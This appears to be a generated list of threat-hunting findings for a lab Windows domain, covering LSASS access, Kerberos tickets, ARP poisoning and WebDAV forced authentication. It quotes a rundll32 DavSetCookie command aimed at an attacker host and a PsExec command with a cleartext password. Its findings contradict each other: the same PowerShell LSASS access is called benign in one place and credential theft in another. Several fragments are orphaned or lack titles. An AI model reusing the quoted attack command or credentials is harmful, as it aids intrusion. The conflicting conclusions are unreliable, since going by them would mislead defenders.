findings.title: LSASS handle opens with full access masks by PowerShell/wsmprovhost are .NET process-management calls, not memory dumping
findings.summary: On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1FFFFF at 03:05:16, and PowerShell.exe (PID 3876) opened lsass.exe with 0x1000 at 03:01:03; on nashua.dmevals.local wsmprovhost.exe (PID 7720) opened lsass.exe (PID 728) with 0x1F3FFF at 03:09:29. The CallTrace for each shows managed .NET frames (System.ni.dll, Microsoft.PowerShell.Commands.Management.ni.dll), i.e. PowerShell's process-management cmdlets querying process information, not a memory read/dump. No dump file was written (the only .dmp files are WerFault.exe WER crash dumps), and no process command line anywhere references lsass, comsvcs, MiniDump, procdump or mimikatz. The 0x1FFFFF opens by wininit.exe/csrss.exe at 03:19:09 coincide with a normal lsass process restart (PID 748, parent wininit.exe).

findings.title: SAM hive registry writes and SAM_DOMAIN/SAM_SERVER handle opens performed by lsass.exe (machine account) - normal OS activity
findings.summary: On scranton.dmevals.local, lsass.exe (PID 748, running as SCRANTON$) wrote HKLM\SAM\SAM\Domains\Account\F at 03:19:10 and opened SAM_SERVER/SAM_DOMAIN/SAM_ALIAS objects (AccessMask 0xf003f/0xf07df/0xf) at 03:19:11-03:20:46. These are the OS's own SAM operations by the Local Security Authority, not an external tool copying hives. No 'reg save', no SAM/SECURITY/SYSTEM hive file copies were created (the only file-create hits matching SAM/SECURITY/SYSTEM were Prefetch .pf files), and no process command line references reg save or SAM.

findings.title: HKLM\SECURITY\Cache\NL$1 writes by lsass.exe are normal cached-credential maintenance
findings.summary: On nashua.dmevals.local lsass.exe (PID 728) set HKLM\SECURITY\Cache\NL$1 four times between 03:11:40 and 03:15:03, and on scranton.dmevals.local lsass.exe set the same value at 03:20:46. These writes are performed by the Local Security Authority process itself as part of normal cached-domain-credential maintenance, not extraction of the cache. No process command line or PowerShell script block references cache, mscache or DCC2, and no tool read the SECURITY hive.

findings.title: No credential-dumping tooling observed across process creations, script blocks or file writes
findings.summary: Stacking all 447 sysmon process creations and 460 security 4688 process creations shows only standard Windows/Azure tooling (svchost, conhost, powershell, cmd, rundll32, PsExec64/PSEXESVC, sdelete64, Azure agents). No mimikatz, procdump, comsvcs.dll MiniDump, reg save, ntdsutil, vssadmin, diskshadow or drsuapi command lines exist in any dataset, and no PowerShell 4104 script block references lsass/mimikatz/sekurlsa/MiniDump/DCSync/ntds. The only .dmp files are WerFault.exe WER crash dumps. No evidence of OS credential dumping was found.

On scranton.dmevals.local at 2020-05-02T03:19:17Z, netsh.exe ran 'trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl"' as NT AUTHORITY\SYSTEM, and stopped it 7 seconds later with 'netsh trace stop'. Both netsh processes are direct children of the Microsoft Azure NetworkWatcherAgent service (NetworkWatcherAgent.exe /service), which was itself installed/started via its own enable.cmd at 03:20:41Z. This is the standard Azure Network Watcher packet-capture mechanism, not adversary sniffing: the capture is short-lived, writes to a GUID-named ETL under the agent's own temp folder, and is driven entirely by the signed Azure agent. No attacker-controlled process, no pcap output, no promiscuous-mode tooling.

findings.title: No MFA/smart-card interception artifacts; observed activity is PsExec lateral movement with cleartext credentials
findings.summary: Hunting for T1111 (Multi-Factor Authentication Interception) across windows.security, windows.sysmon, windows.other and windows.powershell found no evidence of MFA interception. All credential-related hits are normal Windows components: CredentialEnrollmentManagerUserSvc service registration, Credential Manager (vaultsvc.dll), the Smart card PnP Class Filter Driver (scfilter.sys) MuiCache entry, RDP display driver (RdpIdd_IndirectDisplay) enumeration, and CredentialGuard being disabled (0x0) — all written by services.exe/System/lsass.exe on scranton.dmevals.local. LSASS access (Sysmon 10) is exclusively from svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION), i.e. benign handle queries, not credential dumping. The only notable credential activity is PsExec lateral movement: on scranton.dmevals.local, PsExec64.exe was repeatedly run with cleartext credentials (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by) targeting \\NASHUA to launch C:\Windows\Temp\python.exe, producing 4648 explicit-credential logons on nashua.dmevals.local via C:\Windows\PSEXESVC.exe and an RDP logon (LogonType 10, Negotiate) for pbeesly from 172.18.39.2. This is credential USE/lateral movement, not MFA interception, and no smart-card/OTP/MFA token artifacts exist anywhere in the data.

findings.title: WebDAV forced authentication via davclnt DavSetCookie on scranton.dmevals.local
findings.summary: On host scranton.dmevals.local, user pbeesly, the WebClient service (svchost.exe -k LocalService -p -s WebClient) spawned rundll32.exe executing 'C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' five times between 03:08:50 and 03:10:23 UTC on 2020-05-02. This is the canonical T1187 forced-authentication mechanism: the WebClient/WebDAV redirector is pointed at an attacker-controlled host (192.168.0.4) so the victim's machine authenticates to it, leaking NTLM credentials. The matching network side (Zeek, 2020-04-30 window) shows the same host 10.0.1.4 issuing WebDAV OPTIONS/PROPFIND requests to 192.168.0.4 with user agents 'Microsoft-WebDAV-MiniRedir/10.0.18362' and 'DavClnt', including PROPFIND for /webdav/OfficeSupplies.7z and /webdav/python.exe, with repeated 401 Unauthorized responses (the server challenging for credentials). This activity occurs in the context of a broader compromise of scranton (malicious C:\ProgramData\victim\cod.3aka3.scr launched by explorer.exe, PowerShell stager, sdelete64 anti-forensics), consistent with an adversary harvesting credentials.

findings.title: Outbound SMB/WebDAV to 192.168.0.4 and SMB to 10.0.1.6 from scranton (10.0.1.4)
findings.summary: Zeek conn records show host 10.0.1.4 (scranton) making repeated outbound SMB connections to 192.168.0.4 on ports 445 and 139 that were rejected (conn_state REJ, 0 bytes) immediately before the WebDAV HTTP traffic to the same 192.168.0.4 at 00:32:14-00:32:18, indicating the host was probing/being directed to an external SMB/WebDAV listener. The same host also performed large SMB transfers to 10.0.1.6 (up to 4,261,160 bytes) and SMB share access to \\NEWYORK.dmevals.local\sysvol and IPC$ (10.0.0.4). The 192.168.0.4 SMB/WebDAV combination is consistent with forced-authentication infrastructure, though the SMB-to-10.0.1.6 and sysvol access are more typical of normal domain activity.

Both events run as NT AUTHORITY\SYSTEM. These are the only non-system processes in the dataset touching lsass with such broad access masks; the remaining 289 lsass accesses are from svchost.exe with 0x1000 (query-limited) and are benign.

findings.title: Kerberos service-ticket requests (4769/4768) are routine domain authentication

ARP cache poisoning: MAC fc:bd:67:e1:a9:c1 impersonates IP 10.0.1.4 to intercept traffic to NASHUA (10.0.1.6)
findings.summary: In the Zeek capture (2020-04-30 00:06-00:45) host IP 10.0.1.4 is seen with two different source MAC addresses. The legitimate MAC 00:0d:3a:4d:42:f2 is present across the whole window (134 connections, 00:06:38-00:45:00), while a second MAC fc:bd:67:e1:a9:c1 appears only from 00:33:26 onward (44 connections) and exclusively targets 10.0.1.6 (NASHUA) on SMB/445, WinRM/5985, RPC/135 and HTTP/80. A single IP being claimed by a new MAC mid-capture is the signature of ARP cache poisoning / MAC takeover, positioning the attacker in the middle of 10.0.1.4<->10.0.1.6 traffic. Kerberos TGS requests for pbeesly/DMEVALS.LOCAL to cifs/NASHUA and HTTP/NASHUA follow immediately, consistent with credential use against the victim.

findings.title: SMB/WinRM/RPC traffic from spoofed 10.0.1.4 to NASHUA with Kerberos cifs/NASHUA tickets (possible SMB relay)
findings.summary: The spoofing MAC fc:bd:67:e1:a9:c1 drives SMB (445), WinRM (5985), RPC (135) and HTTP (80) connections from 10.0.1.4 to 10.0.1.6 (NASHUA). Kerberos TGS requests for pbeesly/DMEVALS.LOCAL to cifs/NASHUA and HTTP/NASHUA are observed at 00:33:26 and 00:35:25, i.e. immediately after the MAC takeover begins. This is consistent with name-resolution/SMB-relay style credential capture, though no explicit relay tooling or LLMNR/NBT-NS poisoning was observed in the PowerShell or DNS data.

findings.title: No DHCP spoofing activity observed
findings.summary: No DHCP-related events exist in any dataset. The windows.other System channel contains no DHCP codes (1341/1342/1020/1063), the Zeek capture contains no dhcp log type (only conn/files/ssl/x509/dce_rpc/http/dns/kerberos/dpd/smb_files/weird/smb_mapping/notice/pe), and no DHCP-related PowerShell script blocks were found. DHCP spoofing is not observable in this data.

findings.title: Adversary-in-the-Middle positioning via ARP poisoning on the 10.0.1.0/24 segment
findings.summary: The overarching AiTM activity is the MAC takeover of 10.0.1.4 by fc:bd:67:e1:a9:c1 from 00:33:26, redirecting 10.0.1.4<->10.0.1.6 (NASHUA) SMB/WinRM/RPC/HTTP flows through the attacker. The legitimate MAC 00:0d:3a:4d:42:f2 continues to be seen for the same IP, confirming two devices claiming one address. This is the on-path positioning that enables the credential access observed in the Kerberos cifs/NASHUA and HTTP/NASHUA ticket requests.

findings.title: PowerShell opens LSASS with PROCESS_ALL_ACCESS (0x1fffff) on scranton — credential/ticket theft staging
findings.summary: On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1fffff (PROCESS_ALL_ACCESS) at 2020-05-02T03:05:16.654Z, with a CallTrace ending in an UNKNOWN module (UNKNOWN(000001996D28200D)) — the classic signature of in-memory credential/ticket extraction. This is the only non-system process among the LSASS handle-grant events with full access; the other 0x1fffff grants come from legitimate system processes (wininit.exe, csrss.exe). Minutes later, at 2020-05-02T03:21:29Z on the same host, a PowerShell script block (ScriptBlockId bc19aae2-d1f9-49b2-b718-192531ae928f, user pbeesly) executed a reflective shellcode loader using GetProcAddress/GetModuleHandle via Microsoft.Win32.UnsafeNativeMethods and a base64-encoded PE payload. Together these indicate an adversary on scranton stealing credentials/tickets from LSASS memory.

findings.title: No golden-ticket forging observed; krbtgt TGS requests are normal
findings.summary: The 4769 Kerberos service-ticket events include only one krbtgt request by pbeesly@DMEVALS.LOCAL (from 10.0.1.4) and two by the SCRANTON$ machine account, all with Ticket Encryption Type 0x12 and Failure Code 0x0. All 28 4769 events use encryption type 0x12 (AES256) — no RC4 downgrade pattern, no anomalous krbtgt service-ticket volume, and no forged-ticket logon indicators. The 4672 special-privilege events (212) have no populated TargetUserName to stack. No golden-ticket activity is evident.

findings.title: No silver-ticket activity observed
findings.summary: The 4769 service-ticket requests are for machine accounts (NASHUA$, NEWYORK$, SCRANTON$, WEC$) and krbtgt, all successful with encryption type 0x12. There is no evidence of service tickets forged without KDC validation (silver-ticket behavior) — no anomalous service SPN requests or missing corresponding TGT requests in the zeek kerberos capture, which shows normal AS/TGS pairs.

findings.title: No Kerberoasting observed
findings.summary: No PowerShell script blocks referencing Kerberoast/Invoke-Kerberoast/Rubeus were found (zero hits). The zeek kerberos capture shows only normal AS/TGS request pairs for pbeesly to cifs/host/ldap/HTTP services, with no burst of TGS requests to many distinct SPNs that would indicate Kerberoasting. The 4769 events show only 28 requests across a handful of machine-account services.

findings.title: No AS-REP roasting observed
findings.summary: The zeek kerberos capture shows AS requests to krbtgt that return KDC_ERR_PREAUTH_REQUIRED (preauthentication enforced) followed by successful AS exchanges — the normal preauth flow, not AS-REP roasting (which requires accounts with preauth disabled and would show successful AS-REP without the preauth-required error). No PowerShell script blocks referencing AS-REP/GetNPUsers/DontRequirePreAuth were found (zero hits).

findings.title: No forged web credential activity; observed activity is LSASS credential theft (T1003), not T1606
findings.summary: Across the Windows window (2020-05-02 02:55-03:28Z) the only credential-related activity is credential theft from LSASS on scranton.dmevals.local by PowerShell.exe (PID 2976) opening lsass.exe with GrantedAccess 0x1FFFFF and 0x1F3FFF, plus an obfuscated PowerShell script (ReflectiveDelegate/GetProcAddress/GetModuleHandle + base64 shellcode) run as pbeesly. This is T1003 credential dumping, not T1606 forging of web credentials. No cookie or SAML token forging artifacts were found: the only cookie-path file event is a benign Windows INetCookies package file, and the Zeek window (2020-04-30, non-overlapping) contains only WebDAV file transfer (OfficeSupplies.7z, python.exe) with no web authentication traffic. The T1606 checks returned no evidence of forged web credentials.

findings.title: No forged web cookie activity observed
findings.summary: The only file event matching a cookie store is a single benign Windows INetCookies package file created by svchost.exe on scranton.dmevals.local (C:\Windows\ServiceProfiles\LocalService\...\INetCookies). No browser cookie theft, tampering, or forged-cookie authentication was observed. The Zeek HTTP traffic (2020-04-30, non-overlapping window) is WebDAV file transfer only, with no cookie-bearing web authentication. No evidence of T1606.001.

findings.title: No SAML token forging activity observed
findings.summary: No SAML token forging artifacts were found. No process command lines, PowerShell script blocks, or HTTP URLs referencing SAML/ADFS/token/assertion were observed in the Windows or Zeek datasets. The Zeek window (2020-04-30, non-overlapping with the Windows window) contains only WebDAV file transfer to 192.168.0.4 with no federated/web authentication traffic. The only anomalous authentication is a single NtLmSsp network logon (type 3) for pbeesly from 172.18.39.2 on scranton, which is consistent with lateral movement following credential theft rather than SAML token forgery.

findings.title: No MFA request generation activity; windows.other hits are benign RSOP/WMI operations
findings.summary: The T1621 hypothesis (adversary generating repeated MFA push requests to fatigue a user) is not supported by any retrieved event. windows.security contains zero 4625 failed-logon events, so there is no repeated authentication-attempt pattern. No PowerShell 4104 script block contains MFA/2FA/Authenticator/multifactor strings, no Sysmon process command line references mfa/authenticator/login, and no Zeek http/dns record references login/auth/mfa/okta/duo. The windows.other hits that triggered the check (event codes 5857/5858) are routine WMI/Group-Policy RSOP operations on newyork.dmevals.local performed by NT AUTHORITY\SYSTEM (ClientProcessId 1588), e.g. 'Start IWbemServices::DeleteInstance - Root\Rsop\Computer : RSOP_ExtensionStatus...' with ResultCode 0x80041002 — not authentication activity. The only credential-related activity observed is PsExec-based lateral movement by user pbeesly (LogonType 3/2, 4648 explicit credentials, PSEXESVC.exe) between scranton/nashua/newyork, which is lateral movement rather than MFA request generation.
